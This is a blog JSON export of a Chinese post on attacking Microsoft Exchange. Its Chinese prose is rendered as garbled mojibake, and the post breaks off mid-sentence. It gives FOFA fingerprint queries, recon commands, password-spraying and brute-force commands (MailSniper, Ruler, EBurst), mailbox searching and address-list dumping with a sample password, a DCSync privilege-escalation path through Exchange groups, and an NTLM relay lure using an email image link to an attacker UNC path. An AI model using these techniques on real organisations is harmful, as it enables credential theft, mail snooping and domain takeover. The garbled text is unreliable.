{"meta":{"title":"ConsT27's Blog","subtitle":null,"description":"é£èŠ±","author":"ConsT27","url":"http://const27.com","root":"/"},"pages":[],"posts":[{"title":"é’ˆå¯¹exchangeçš„æ”»å‡»æ–¹å¼","slug":"é’ˆå¯¹EXCHANGEçš„æ”»å‡»æ–¹å¼","date":"2021-10-17T16:37:53.636Z","updated":"2021-10-15T07:34:54.976Z","comments":true,"path":"2021/10/18/é’ˆå¯¹EXCHANGEçš„æ”»å‡»æ–¹å¼/","link":"","permalink":"http://const27.com/2021/10/18/%E9%92%88%E5%AF%B9EXCHANGE%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/","excerpt":"","text":"exchangeå¿«é€Ÿäº†è§£FOFAï¼š microsoft exchange 2013ï¼šapp&#x3D;&quot;Microsoft-Exchange-2013&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU21&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU17&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU23&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU13&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU22&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU11&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU16&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU19&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU18&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU20&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU12&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU15&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU10&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU9&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU14&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2013-SP1&quot;||app&#x3D;&quot;Microsoft-Exchange-2013&quot;microsoft exchange 2016ï¼šapp&#x3D;&quot;Microsoft-Exchange-Server-2016-CU19&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU12&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU17&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU14&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU11&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU9&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU16&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU10&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU13&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU18&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2016-CU4&quot;||app&#x3D;&quot;Microsoft-Exchange-2016-POP3-server&quot;microsoft exchange 2019ï¼šapp&#x3D;&quot;Microsoft-Exchange-Server-2019-CU5&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU3&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-Preview&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU8&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU7&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU2&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU6&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-RTM&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2019-CU4&quot;microsoft exchange 2010ï¼šapp&#x3D;&quot;Microsoft-Exchange-2010-POP3-server-version-03.1&quot;||app&#x3D;&quot;Microsoft-Exchange-Server-2010&quot; é‚®ä»¶æœåŠ¡å™¨è§’è‰²åœ¨exchange 2010ä¸­ï¼ŒexchangeåŒ…å«äº”ä¸ªæœåŠ¡å™¨è§’è‰²ï¼Œåˆ†åˆ«ä¸ºé‚®ç®±æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œé›†çº¿ä¼ è¾“æœåŠ¡å™¨ï¼Œç»Ÿä¸€æ¶ˆæ¯æœåŠ¡å™¨ï¼Œè¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨ã€‚åœ¨åæ¥çš„exchange 2013ä¸­æœåŠ¡å™¨è¢«ç²¾ç®€ä¸º3ä¸ªï¼šé‚®ç®±æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ï¼Œè¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨exchange 2016å’Œ2019ä¸­åˆ™åªæœ‰ é‚®ç®±æœåŠ¡å™¨å’Œè¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨äº†ã€‚ exchange 2010é‚®ç®±æœåŠ¡å™¨ mailbox serverï¼Œæä¾›æ‰˜ç®¡é‚®ç®±ï¼Œå…¬å…±æ–‡ä»¶å¤¹ç­‰æœåŠ¡ï¼Œæ˜¯å¿…é€‰çš„æœåŠ¡å™¨è§’è‰² å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ client access serverï¼Œç”¨æ¥æ¥æ”¶å¹¶å¤„ç†ä¸åŒå®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶æä¾›å„ç§æ¥å£ç»™å®¢æˆ·ä»¥è®¿é—®ExchangeæœåŠ¡, MAPIè®¿é—®POP3å’ŒIMAP4è®¿é—®Outlook Web Appè®¿é—®ï¼ˆOWAï¼‰Outlook Anywhereè®¿é—®Autodiscoverè‡ªåŠ¨å‘ç°æœåŠ¡å¯ç”¨æ€§æœåŠ¡ é›†çº¿ä¼ è¾“æœåŠ¡å™¨ hub transport serverï¼Œæ ¸å¿ƒæœåŠ¡æ˜¯Microsoft Exchange Transportï¼Œç”¨äºå¤„ç†å¤§å¤šæ•°é‚®ä»¶çš„è·¯ç”±ã€ç­–ç•¥ç­‰ä»¥åŠMail Flowã€‚èµ·ä¸€ä¸ªé‚®ä»¶ä¼ è¾“ä¸­ç»§çš„ä½œç”¨ã€‚ ç»Ÿä¸€æ¶ˆæ¯æœåŠ¡å™¨ unified messaging serverï¼Œç”¨äºå…è®¸é‚®ç®±ç”¨æˆ·å¯ä»¥åœ¨é‚®ä»¶ä¸­å‘é€å­˜å‚¨è¯­éŸ³æ¶ˆæ¯å’Œä¼ çœŸæ¶ˆæ¯ï¼Œå¯é€‰è§’è‰² è¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨ edge transport serverï¼Œé€šå¸¸éƒ¨ç½²äºç½‘ç»œè¾¹ç•Œã€‚å…¶æ¥å—æ¥è‡ªå†…éƒ¨ç»„ç»‡çš„é‚®ä»¶å’Œæ¥è‡ªå¤–éƒ¨å¯ä¿¡æœåŠ¡å™¨çš„é‚®ä»¶ï¼Œç„¶ååº”ç”¨ç‰¹å®šçš„ååƒåœ¾é‚®ä»¶ã€åç—…æ¯’ç­–ç•¥ï¼Œæœ€åå°†é€šè¿‡ç­–ç•¥ç­›é€‰çš„é‚®ä»¶è·¯ç”±åˆ°å†…éƒ¨çš„é›†çº¿ä¼ è¾“æœåŠ¡å™¨ï¼Œå¯é€‰è§’è‰² exchange 2013é‚®ç®±æœåŠ¡å™¨ æ‰˜ç®¡é‚®ç®±ã€å…¬å…±æ–‡ä»¶å¤¹ç­‰æ•°æ®ï¼Œä¸»è¦åŒ…å«é›†çº¿ä¼ è¾“æœåŠ¡ï¼ˆHub Transport serviceï¼‰å’Œé‚®ç®±ä¼ è¾“æœåŠ¡ï¼ˆMailbox Transport serviceï¼‰ä¸¤å¤§ç»„ä»¶æœåŠ¡ã€‚ å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ è´Ÿè´£è®¤è¯ã€é‡å®šå‘ã€ä»£ç†æ¥è‡ªå¤–éƒ¨ä¸åŒå®¢æˆ·ç«¯çš„è®¿é—®è¯·æ±‚ï¼Œä¸»è¦åŒ…å«å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ï¼ˆClient Access serviceï¼‰å’Œå‰ç«¯ä¼ è¾“æœåŠ¡ï¼ˆFront End Transport serviceï¼‰ä¸¤å¤§ç»„ä»¶ã€‚ è¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨ è´Ÿè´£è·¯ç”±å‡ºç«™ä¸å…¥ç«™é‚®ä»¶ã€ç­–ç•¥åº”ç”¨ç­‰ã€‚ æ¥å£å’Œåè®®OWAowaå³ outlook web app,å³outlookçš„ç½‘é¡µç‰ˆã€‚ï¼ˆoutlookæ˜¯exchangeçš„å®¢æˆ·ç«¯è½¯ä»¶ï¼Œè®¸å¤šç”µè„‘éƒ½æœ‰æ‰€é¢„è£…ï¼‰åœ°å€ä¸€èˆ¬ä¸º http://aa.com/owa ECPExchange Administrative Center,å³exchangeç®¡ç†ä¸­å¿ƒï¼Œç®¡ç†å‘˜çš„webæ§åˆ¶å° outlook anywhereä½œç”¨æ˜¯å¯ä»¥è®©å¤–ç½‘ç”¨æˆ·ç›´æ¥é€šè¿‡outlook anywhere ç›´æ¥ç™»å½•åˆ°exchangeé‚®ç®±è€Œæ— éœ€ä½¿ç”¨VPNã€‚è¯¥ç‰¹æ€§åœ¨exchange server 2013ä¸­é»˜è®¤å¼€å¯ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨exchange server 2013 ä»¥åoutlook ä¸å†åŒºåˆ†å†…å¤–ç½‘ç¯å¢ƒã€‚ MAPIäºExchange 2013 SP1å’ŒOutlook 2013 SP1ä¸­è¢«æå‡ºçš„ä¸€ç§æ–°çš„outlookä¸exchangeäº¤äº’ä¼ è¾“åè®®ã€‚ EASExchange ActiveSyncæ˜¯ä¸€ç§å…è®¸ç”¨æˆ·é€šè¿‡ç§»åŠ¨è®¾å¤‡æˆ–å…¶ä»–ä¾¿æºå¼è®¾å¤‡è®¿é—®å’Œç®¡ç†é‚®ä»¶ã€è”ç³»äººã€æ—¥å†ç­‰ExchangeåŠŸèƒ½çš„åŒæ­¥åè®®ï¼Œåœ¨Windowsä¸Šä½¿ç”¨æ—¶å…¶è¿›ç¨‹åç§°ä¸ºwcesomm.exeã€‚â€ EWSExchange Web Serviceï¼Œæ˜¯exchangeæä¾›çš„ä¸€å¥—APIç¼–ç¨‹æ¥å£ï¼Œç”¨äºæ“ä½œexchangeç›¸å…³åŠŸèƒ½ï¼Œäºexchange server 2007è¢«æå‡ºã€‚ åŠŸèƒ½å’ŒæœåŠ¡AutodiscoverAutodiscoverï¼Œè‡ªåŠ¨å‘ç°ï¼Œæ˜¯exchange server 2007 æ¨å‡ºçš„ä¸€ä¸ªæœåŠ¡ã€‚è¯¥æœåŠ¡ç›®çš„æ˜¯ç®€åŒ–ç”¨æˆ·ç™»å½•æµç¨‹ï¼šç”¨æˆ·åªéœ€è¦è¾“å…¥è‡ªå·±çš„ç”µå­é‚®ä»¶åœ°å€å’Œå¯†ç ï¼Œå°±èƒ½å¤Ÿé€šè¿‡AutodiscoveræœåŠ¡è·å–è¿è¡Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ‰€éœ€çš„é…ç½®ä¿¡æ¯è¯¥æœåŠ¡è¿è¡Œåœ¨å®¢æˆ·ç«¯è®¿é—®æœåŠ¡å™¨ä¸Šã€‚ GALGALå³å…¨å±€åœ°å€è¡¨ï¼ˆglobal address listï¼‰ è®°å½•äº†åŸŸä¸­ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ä¸å…¶é‚®ç®±åœ°å€ï¼Œä»¥å½¢æˆåŸŸç”¨æˆ·ä¸é‚®ç®±ç”¨æˆ·ä¹‹é—´çš„å…³è”ã€‚åœ¨æ¸—é€ä¸­å¯ä»¥é€šè¿‡GALæ¥è·å–æ‰€æœ‰é‚®ç®±åœ°å€ã€‚ EXCHANGEä¿¡æ¯æœé›†åœ¨æ¸—é€ä¸­è¯¥å¦‚ä½•å‘ç°å“ªä¸€å°æœºå™¨æ˜¯EXCHANGEæœåŠ¡å™¨å‘¢ï¼Ÿåœ¨exchange server 2019 ä¸­ï¼Œç”±äºåªç»†åˆ†äº†é‚®ç®±æœåŠ¡å™¨å’Œè¾¹ç¼˜ä¼ è¾“æœåŠ¡å™¨ï¼Œæ‰€ä»¥å¼€æ”¾äº†å¦‚OWAï¼ŒECPç­‰æ¥å£çš„æœåŠ¡å™¨å³ä¸ºé‚®ç®±æœåŠ¡å™¨ã€‚ å‘ç°ç«¯å£æ‰«æexchangeä¼šå¯¹å¤–æš´éœ²æ¥å£å¦‚OWA,ECPç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›ç«¯å£ç‰¹å¾æ¥å‘ç°exchangeã€‚exchange æ¥å£ä¼šæš´éœ²åœ¨80ç«¯å£ï¼ŒåŒæ—¶25/587/2525ç­‰ç«¯å£ä¸Šä¼šæœ‰SMTPæœåŠ¡ã€‚ spnå¦‚æœå·²ç»æ‰“å…¥åŸŸä¸­ï¼Œæƒ³å¿«é€Ÿçš„å®šä½åˆ°exchangeæœåŠ¡å™¨ï¼Œåªéœ€è¦æŸ¥è¯¢åŸŸä¸­spnæœåŠ¡å³å¯ã€‚ setspn -q *&#x2F;* ç‰¹æ®ŠåŸŸåhttps:&#x2F;&#x2F;autodiscover.domain.com&#x2F;autodiscover&#x2F;autodiscover.xmlhttps:&#x2F;&#x2F;owa.domian&#x2F;owa&#x2F;https:&#x2F;&#x2F;mail.domain.com&#x2F;https:&#x2F;&#x2F;webmail.domain.com&#x2F; å¯»æ‰¾æ¥å£&#x2F;autoDiscover&#x2F; è‡ªExchange Server 2007å¼€å§‹æ¨å‡ºçš„ä¸€é¡¹è‡ªåŠ¨æœåŠ¡ï¼Œç”¨äºè‡ªåŠ¨é…ç½®ç”¨æˆ·åœ¨Outlookä¸­é‚®ç®±çš„ç›¸å…³è®¾ç½®ï¼Œç®€åŒ–ç”¨æˆ·ç™»é™†ä½¿ç”¨é‚®ç®±çš„æµç¨‹ã€‚&#x2F;ecp&#x2F;â€œExchange Control Panelâ€ Exchangeç®¡ç†ä¸­å¿ƒï¼Œç®¡ç†å‘˜ç”¨äºç®¡ç†ç»„ç»‡ä¸­çš„Exchangeçš„Webæ§åˆ¶å°&#x2F;eWS&#x2F;â€œExchange Web Servicesâ€ Exchange Web Service,å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´åŸºäºHTTPçš„SOAPäº¤äº’&#x2F;mapi&#x2F; Outlookè¿æ¥Exchangeçš„é»˜è®¤æ–¹å¼ï¼Œåœ¨2013å’Œ2013ä¹‹åå¼€å§‹ä½¿ç”¨ï¼Œ2010 sp2åŒæ ·æ”¯æŒ&#x2F;microsoft-Server-ActiveSync&#x2F; ç”¨äºç§»åŠ¨åº”ç”¨ç¨‹åºè®¿é—®ç”µå­é‚®ä»¶&#x2F;OAB&#x2F;â€œOffline Address Bookâ€ ç”¨äºä¸ºOutlookå®¢æˆ·ç«¯æä¾›åœ°å€ç°¿çš„å‰¯æœ¬ï¼Œå‡è½»Exchangeçš„è´Ÿæ‹…&#x2F;owa&#x2F;â€œOutlook Web APPâ€ Exchange owa æ¥å£ï¼Œç”¨äºé€šè¿‡webåº”ç”¨ç¨‹åºè®¿é—®é‚®ä»¶ã€æ—¥å†ã€ä»»åŠ¡å’Œè”ç³»äººç­‰&#x2F;powerShell&#x2F; ç”¨äºæœåŠ¡å™¨ç®¡ç†çš„Exchangeç®¡ç†æ§åˆ¶å°&#x2F;Rpc&#x2F; æ—©æœŸçš„Outlookè¿˜ä½¿ç”¨ç§°ä¸ºOutlook Anywhereçš„RPCäº¤äº’ å·¥å…·ä½¿ç”¨https://github.com/vysec/checkO365 ç‰ˆæœ¬ç¡®å®šå¯ä»¥é€šè¿‡OWA,ECPçš„HTMLæºä»£ç ç¡®å®šç‰ˆæœ¬ æºä»£ç æœç´¢/owa/ å¯ä»¥çœ‹åˆ°ä¸€ä¸²æ•°å­— 15.0.1130,è¿™æ˜¯exchangeå…·ä½“ç‰ˆæœ¬å·ï¼Œåˆ°è¿™é‡ŒæŸ¥å°±è¡Œäº†https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019 IPæ³„éœ²æŠ“åŒ…ä»¥ä¸‹æ¥å£åŒ…ï¼Œå°†HTTPç‰ˆæœ¬æ”¹ä¸º1.0ï¼Œå¹¶åˆ é™¤HOSTå¤´ï¼Œå°±ä¼šæš´éœ²exchange ipï¼Œæœ‰æ—¶ä¼šæš´éœ²å†…ç½‘IP &#x2F;Microsoft-Server-ActiveSync&#x2F;default.eas&#x2F;Microsoft-Server-ActiveSync&#x2F;Autodiscover&#x2F;Autodiscover.xml&#x2F;Autodiscover&#x2F;Exchange&#x2F;Rpc&#x2F;EWS&#x2F;Exchange.asmx&#x2F;EWS&#x2F;Services.wsdl&#x2F;EWS&#x2F;ecp&#x2F;OAB&#x2F;OWA&#x2F;aspnet_client&#x2F;PowerShell æƒ³è¦æ›´æ–¹ä¾¿çš„è¯ï¼Œå¯ä»¥ç”¨msfçš„æ¨¡å—è‡ªåŠ¨æœé›† use auxiliary/scanner/http/owa_iis_internal_ip æ³„éœ²exchangeæœåŠ¡å™¨ä¿¡æ¯å½“æˆ‘ä»¬å¯¹exchangeæœåŠ¡å™¨è¿›è¡ŒNTLMè´¨è¯¢æ—¶,åœ¨æœåŠ¡å™¨è¿”å›challengeæ—¶åŒæ—¶ä¼šè¿”å›åŸŸä¿¡æ¯ï¼Œæœºå™¨åç­‰ä¿¡æ¯ã€‚ä»¥æ­¤ä¸ºåŸºç¡€å¯ä»¥å¯¹exchangeè¿›è¡ŒæœåŠ¡å™¨ä¿¡æ¯æœé›† ç›´æ¥nmap nmap host -p 443 --script http-ntlm-info --script-args http-ntlm-info.root&#x3D;&#x2F;rpc&#x2F;rpcproxy.dll -Pn EXCHANGE å¤–å›´æ‰“ç‚¹çˆ†ç ´æ¥è§¦åˆ°exchangeçš„ç¬¬ä¸€æ­¥è‡ªç„¶æ˜¯æ¥è§¦åˆ°å®ƒçš„æ¥å£æœåŠ¡å¦‚OWA,ECPç­‰ã€‚ç”±äºæ˜¯ç™»å½•æ¡†ï¼Œæˆ‘ä»¬è‡ªç„¶å¯ä»¥ç”¨çˆ†ç ´æ¥è¿›è¡Œæ”»å‡»ã€‚é€šå¸¸æƒ…å†µä¸‹EXCHANGEä¸é™åˆ¶å¤§å­—å…¸çˆ†ç ´ã€‚ å¸¸è§å¯çˆ†ç ´æ¥å£ &#x2F;Autodiscover&#x2F;Autodiscover.xml # è‡ª Exchange Server 2007 å¼€å§‹æ¨å‡ºçš„ä¸€é¡¹è‡ªåŠ¨æœåŠ¡,ç”¨äºè‡ªåŠ¨é…ç½®ç”¨æˆ·åœ¨Outlookä¸­é‚®ç®±çš„ç›¸å…³è®¾ç½®,ç®€åŒ–ç”¨æˆ·ç™»å½•ä½¿ç”¨é‚®ç®±çš„æµç¨‹ã€‚&#x2F;Microsoft-Server-ActiveSync&#x2F;default.eas&#x2F;Microsoft-Server-ActiveSync # ç”¨äºç§»åŠ¨åº”ç”¨ç¨‹åºè®¿é—®ç”µå­é‚®ä»¶&#x2F;Autodiscover&#x2F;Rpc&#x2F; # æ—©æœŸçš„ Outlook è¿˜ä½¿ç”¨ç§°ä¸º Outlook Anywhere çš„ RPC äº¤äº’&#x2F;EWS&#x2F;Exchange.asmx&#x2F;EWS&#x2F;Services.wsdl&#x2F;EWS&#x2F; # Exchange Web Service,å®ç°å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´åŸºäºHTTPçš„SOAPäº¤äº’&#x2F;OAB&#x2F; # ç”¨äºä¸ºOutlookå®¢æˆ·ç«¯æä¾›åœ°å€ç°¿çš„å‰¯æœ¬,å‡è½» Exchange çš„è´Ÿæ‹…&#x2F;owa # Exchange owa æ¥å£,ç”¨äºé€šè¿‡webåº”ç”¨ç¨‹åºè®¿é—®é‚®ä»¶ã€æ—¥å†ã€ä»»åŠ¡å’Œè”ç³»äººç­‰&#x2F;ecp # Exchange ç®¡ç†ä¸­å¿ƒ,ç®¡ç†å‘˜ç”¨äºç®¡ç†ç»„ç»‡ä¸­çš„Exchange çš„Webæ§åˆ¶å°&#x2F;Mapi # Outlookè¿æ¥ Exchange çš„é»˜è®¤æ–¹å¼,åœ¨2013å’Œ2013ä¹‹åå¼€å§‹ä½¿ç”¨,2010 sp2åŒæ ·æ”¯æŒ&#x2F;powershell # ç”¨äºæœåŠ¡å™¨ç®¡ç†çš„ Exchange ç®¡ç†æ§åˆ¶å° çˆ†ç ´æ¯”è¾ƒå®ç”¨çš„å·¥å…·æœ‰Eburstå’ŒRuler https://github.com/grayddq/EBurst ï¼ˆpyï¼‰ https://github.com/sensepost/ruler ï¼ˆexeï¼‰ rulerç”±äºwindowsç‰ˆçš„æ˜¾ç¤ºä¼¼ä¹æœ‰ç‚¹é—®è…¿ï¼Œè¿™é‡Œç”¨çš„linuxç‰ˆæœ¬ autodiscover çˆ†ç ´çš„åŸç†æ˜¯ï¼Œè®¿é—®autodiscoveræ—¶æµè§ˆå™¨ä¼šå¼¹å‡ºè®¤è¯æ¡†ï¼Œå½“è¾“å…¥æ­£ç¡®çš„å‡­è¯ååˆ™ä¼šæ˜¾ç¤ºXMLæ–‡æ¡£å†…å®¹ã€‚ ps://github.com/dafthack/MailSniper ï¼ˆps1ï¼‰ ä¸‹é¢çš„æ˜¯å¯†ç å–·æ´’çš„æ”»å‡»æ–¹å¼ï¼Œ-Passwordé¡¹ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºä¸€ä¸ªè®°å½•passwordçš„å­—å…¸txt å¯¹OWAè¿›è¡Œçˆ†ç ´Import-Module .\\MailSniper.ps1Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose å¯¹EWSè¿›è¡Œçˆ†ç ´Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\\user.txt -Password password -Threads 1 -Domain domainname -OutFile out.txt -Verbose EXCHANGE åæ¸—é€é‚®ä»¶å†…å®¹æ£€ç´¢æˆ‘ä»¬è·å–ä¸€ä¸ªexchangeç”¨æˆ·ä»¥åï¼Œå¯ä»¥å¯¹é‚®ä»¶åˆ—è¡¨è¿›è¡Œæ£€ç´¢è·å–æ•æ„Ÿä¿¡æ¯ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ­¥æ¸—é€ MailSniper å¯ä»¥å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œä½†æ˜¯è¿™ä¸ªå·¥å…·æ„Ÿè§‰è¢«æ€çš„æ¯”è¾ƒä¸¥é‡ï¼Œå¯ä»¥è¯•ç€ä¿®æ”¹ä¸€ä¸‹å‡½æ•°åå˜é‡åå•¥çš„å…å…æ€ã€‚ æ£€ç´¢æŒ‡å®šç”¨æˆ· æ£€ç´¢rengan@const.comçš„ æ”¶ä»¶ç®±æ–‡ä»¶å¤¹é‡Œçš„ å†…å®¹å«æœ‰æœºå¯†çš„ é‚®ä»¶ï¼Œåœ¨å¯ç”¨remoteå‚æ•°åä¼šå¼¹å‡ºä¸€ä¸ªè¾“å…¥æ¡†è¾“å…¥é‚®ç®±ç¥¨æ®Invoke-SelfSearch -Mailbox rengan@const.com -Terms *æœºå¯†* -Folder æ”¶ä»¶ç®± -ExchangeVersion Exchange2013_SP1 -remote -OutputCsv a.csv å¯ä»¥å‘ç°åœ¨ä¸­æ–‡çš„exchangeä¸‹ï¼Œç”¨æˆ·çš„é‚®ä»¶ä¸€èˆ¬å­˜æ”¾äºâ€â€æ”¶ä»¶ç®±â€â€æ–‡ä»¶å¤¹ï¼Œè€Œå¯¹äºè‹±æ–‡åˆ™æ˜¯â€inboxâ€ è·å–å…¨å±€åœ°å€è¡¨ä¾æ—§é€šè¿‡MailSniper å®ç°ï¼Œåœ¨æˆ‘ä»¬è·å¾—ä¸€ä¸ªåˆæ³•ç”¨æˆ·çš„å‡­æ®ä»¥åï¼Œå°±å¯ä»¥é€šè¿‡è·å–å…¨å±€åœ°å€è¡¨æ¥è·å–æ‰€æœ‰é‚®ç®±åœ°å€ã€‚ Get-GlobalAddressList -ExchHostname Ex -UserName rengan -ExchangeVersion Exchange2013_SP1 -Password ganren@123456 æŸ¥æ‰¾å­˜åœ¨ç¼ºé™·çš„ç”¨æˆ·é‚®ç®±æƒé™å§”æ´¾ä¸€ä¸ªç”¨æˆ·çš„æ–‡ä»¶å¤¹æ˜¯å¯ä»¥ç»™å…¶ä»–ç”¨æˆ·æƒé™çš„ã€‚ ç‚¹å‡»æ­¤å¤„çš„æƒé™ï¼Œæ¥åˆ°ä»¥ä¸‹ç•Œé¢ï¼Œè¿™é‡Œçš„é»˜è®¤å³ æ‰€æœ‰ç”¨æˆ·(everyone) çš„å¯¹æ­¤æ–‡ä»¶å¤¹çš„æƒé™ï¼Œæˆ‘è¿™é‡Œæ˜¯æŠŠæƒé™ç»™çš„å¾ˆé«˜ å®æˆ˜ä¸­ä¹Ÿå¯èƒ½ä¼šé‡åˆ°ç”¨æˆ·Aå¯¹ç”¨æˆ·Bçš„æ”¶ä»¶ç®±æœ‰è¯»å†™æƒé™çš„æƒ…å†µï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨è·å–ç”¨æˆ·Açš„å‡­æ®åå¯ä»¥è¿›è€Œè¯»å–ç”¨æˆ·Bçš„æ”¶ä»¶ç®±ã€‚ ç”¨MailSniper å®ç° Invoke-OpenInboxFinder -ExchangeVersion Exchange2013_SP1 -ExchHostname ex.const.com -EmailList .\\user.txt -remote æ—¢ç„¶è¿™é‡Œå¯¹administratorçš„æ”¶ä»¶ç®±å¯è¯»ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨invoke-selfsearch è¿›è¡Œè¯¦ç»†çš„é‚®ä»¶æ£€ç´¢äº†ã€‚ é€šè¿‡exchangeç”¨æˆ·ç»„è¿›è¡ŒåŸŸææƒexchangeå®‰è£…åä¼šåœ¨ADä¸Šç”Ÿæˆä¸¤ä¸ªå®¹å™¨ å…¶ä¸­exchange windows permissionsç»„çš„ç”¨æˆ·æ‹¥æœ‰writeDACLæƒé™ï¼Œ Exchange Trusted Subsystem æ˜¯ Exchange Windows Permission çš„æˆå‘˜ï¼Œèƒ½ç»§æ‰¿writedaclæƒé™ï¼Œæœ‰è¿™ä¸ªæƒé™åå°±èƒ½ä½¿ç”¨dcsyncå¯¼å‡ºæ‰€æœ‰ç”¨æˆ·hashã€‚å…¶ä¸­exchange trusted subsystemç»„ç”šè‡³å¯èƒ½æœ‰ç»§æ‰¿è‡ªadministratorsç»„çš„æƒé™ã€‚ åŒæ—¶ï¼Œåœ¨å®‰è£…exchangeåè¿˜ä¼šç”Ÿæˆä¸€ä¸ªç»„Organization Managementï¼Œè¿™ä¸ªç»„å¯ä»¥ä¿®æ”¹å…¶ä»–exchangeç»„çš„ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥å½“ç„¶ä¹Ÿå¯ä»¥ä¿®æ”¹Exchange Trusted Subsystemç»„çš„æˆå‘˜ä¿¡æ¯ï¼Œæ¯”å¦‚å‘é‡Œé¢åŠ ä¸€ä¸ªä»¥è·å¾—çš„ç”¨æˆ·ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œåªè¦è·å¾—Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,å°±å¯ä»¥é€šè¿‡dcsyncæ¥è·å–æ•´ä¸ªåŸŸæƒé™ã€‚å½“ç„¶ï¼Œæƒ³è·å¾—ä¸Šè¿°ç»„ç”¨æˆ·æƒé™ï¼Œè¿˜æ˜¯ä¸å¤ªå®¹æ˜“çš„ã€‚ NTLM relayç”¨exchangeä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿çš„è¿›è¡ŒNTLM relayï¼šç»™ç”¨æˆ·å‘ä¸€å°é‚®ä»¶ï¼Œå…¶ä¸­åŒ…å«çš„å›¾ç‰‡é“¾æ¥å½¢å¦‚ \\\\10.10.10.1\\a.jpgï¼Œç”¨æˆ·æ”¶åˆ°é‚®ä»¶ååˆ™ä¼šå‘10.10.10.1å‘é€NTLMè´¨è¯¢ï¼Œä»è€Œé€ æˆNTLM relayã€‚å…¶å®EXCHANGE å¾ˆå¤šCVE éƒ½æ˜¯ä¸NTLM 